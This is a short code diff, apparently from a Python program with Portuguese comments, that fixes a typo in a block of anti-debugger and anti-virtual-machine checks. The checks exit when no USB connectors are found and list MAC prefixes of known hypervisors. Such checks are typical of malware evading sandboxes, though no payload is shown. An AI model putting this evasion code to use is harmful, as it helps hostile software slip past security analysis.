@@ -34,7 +34,7 @@ elif windll.kernel32.CheckRemoteDebuggerPresent(windll.kernel32.GetCurrentProces
     
 # anti-vm (portas usb)
 if len(wmi.WMI().Win32_PortConnector()) == 0:
-    sys.exit()()
+    sys.exit()
 
 # anti-vm (endereço mac)
 PREFIXOS = {'08:00:27', '00:05:69', '00:0C:29', '00:1C:14', '00:50:56', '00:1C:42', '00:16:3E', '0A:00:27'}
